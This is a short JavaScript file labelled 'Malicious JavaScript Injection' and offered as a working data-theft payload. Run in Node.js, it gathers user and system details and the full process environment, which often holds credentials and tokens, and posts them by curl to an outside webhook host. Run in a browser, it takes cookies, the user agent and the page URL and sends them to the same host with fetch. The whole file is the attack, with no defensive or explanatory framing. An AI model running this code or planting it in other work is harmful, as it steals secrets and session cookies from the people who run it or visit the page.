// Malicious JavaScript Injection
// Send data to your webhook
function exfiltrate(data) {
    fetch("https://eorcrwihz26p9fd.m.pipedream.net", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });
}

// Check if running in Node.js (server-side RCE)
if (typeof require !== "undefined") {
    const os = require("os");
    const { execSync } = require("child_process");

    const userInfo = os.userInfo();
    const systemInfo = {
        username: userInfo.username,
        homedir: userInfo.homedir,
        shell: userInfo.shell,
        platform: os.platform(),
        arch: os.arch(),
        currentDir: process.cwd(),
        env: process.env
    };

    // Send system info via curl
    execSync(`curl -X POST -d '${JSON.stringify(systemInfo)}' https://eorcrwihz26p9fd.m.pipedream.net`);
} else {
    // Running in browser - collect browser-based info
    const browserInfo = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        cookies: document.cookie,
        location: window.location.href
    };

    // Exfiltrate browser data
    exfiltrate(browserInfo);
}

